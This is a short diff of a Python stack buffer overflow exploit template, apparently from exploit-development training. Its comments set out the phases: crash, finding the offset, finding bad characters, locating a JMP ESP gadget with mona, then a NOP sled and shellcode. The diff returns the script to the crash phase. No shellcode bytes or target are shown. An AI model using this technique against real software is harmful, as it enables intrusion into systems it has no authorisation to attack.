@@ -31,22 +31,23 @@ def main():
 #####################################
 	buf = ""
 	# PHASE 0 CRASH
-	#buf += "A"*buf_tot_len
+	buf += "A"*buf_tot_len
 
 	# PHASE 1, FIND OFFSET
 	#buf += cyc
 
 	# PHASE 2, FIND BAD CHRS
-	buf += "A"*(offset_srp - len(buf))
+	#buf += "A"*(offset_srp - len(buf))
 	#buf += "BBBB"
 	#buf += bd_ch
+	
 	# PHASE 3, FIND GADGET
 	# !mona jmp -r esp -cpb "\x00\x0a\x0d"  --> 080416BF, 080414C3  (little endian)
 	# !mona jmp -r esp 
 	# !mona findwild -m kernel32.dll -s "jmp esp" -cpb "\x00\x0a\x0d"
 	# gadget JMP ESP @
 	# E.G: 080416BF, 080414C3, 758E3132, 75943165
-	buf += struct.pack("<I",ptr_jmp_esp)
+	#buf += struct.pack("<I",ptr_jmp_esp)
 
 	# PHASE 3.5, TEST WITH INTERUPT
 	# INT 3 (soft breakpoint)
@@ -54,10 +55,10 @@ def main():
 
 	# PHASE 4, EXPLOIT
 	# NOP SLED
-	buf += "\x90"*12
+	#buf += "\x90"*12
 	# sub ESP
 	#buf += "\x83\xec\x10"
-	buf += shellcode
+	#buf += shellcode
 
 	buf += "D"*(buf_tot_len - len(buf))
 	buf += "\n"
